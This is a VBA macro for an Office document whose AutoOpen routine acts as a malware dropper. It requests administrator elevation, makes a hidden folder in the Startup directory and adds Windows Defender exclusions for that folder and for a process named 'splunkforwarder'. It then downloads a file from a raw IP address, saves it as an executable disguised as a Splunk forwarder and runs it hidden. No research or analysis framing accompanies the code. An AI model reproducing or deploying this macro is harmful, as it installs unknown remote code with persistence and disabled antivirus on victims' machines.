Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)

Sub AutoOpen()
    ' Check if running as administrator
    On Error Resume Next
    Dim isAdmin As Boolean
    ' Query the system to check if the script is running with administrative privileges
    isAdmin = (GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2").ExecQuery("Select * from Win32_Account where SID = 'S-1-5-32-544'").Count > 0)
    On Error GoTo 0

    If Not isAdmin Then
        ' If not running as administrator, restart the script with elevated privileges
        Dim shell As Object
        Set shell = CreateObject("Shell.Application")
        ' Re-run the script using the "runas" verb to elevate privileges
        shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
        Exit Sub
    End If

    ' Define variables for paths and objects
    Dim startupPath As String
    Dim hiddenFolder As String
    Dim command As String
    Dim xHttp As Object
    Dim bStrm As Object

    ' Get the startup folder path (where startup programs are located)
    startupPath = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup"

    ' Create a hidden folder within the startup directory
    hiddenFolder = startupPath & "\HiddenFolder"
    MkDir hiddenFolder
    SetAttr hiddenFolder, vbHidden

    ' Exclude the hidden folder and the process from Windows Defender scanning
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "powershell.exe", "-NoProfile -ExecutionPolicy Unrestricted -Command ""Add-MpPreference -ExclusionPath '" & hiddenFolder & "'""", "", "runas", 0
    shell.ShellExecute "powershell.exe", "-NoProfile -ExecutionPolicy Unrestricted -Command ""Add-MpPreference -ExclusionProcess 'splunkforwarder'""", "", "runas", 0
    
    Sleep 3000
    
    ' Download the splunkforwarder.exe file from a specified URL
    Set xHttp = CreateObject("Microsoft.XMLHTTP") ' Create an HTTP request object
    Set bStrm = CreateObject("Adodb.Stream") ' Create a stream object to handle binary data

    ' Open a connection to the specified URL to download the file
    xHttp.Open "GET", "http://9.53.99.47/splunkforwarder.txt", False
    xHttp.Send

    With bStrm
        .Type = 1
        .Open
        .write xHttp.responseBody
        .savetofile hiddenFolder & "\splunkforwarder.exe", 2 ' Save in the hidden folder
    End With
    
    Sleep 3000

    ' Execute the downloaded splunkforwarder.exe file with elevated privileges
    shell.ShellExecute "powershell.exe", "-NoProfile -ExecutionPolicy Unrestricted -Command ""Start-Process '" & hiddenFolder & "\splunkforwarder.exe'""", "", "runas", 0
End Sub

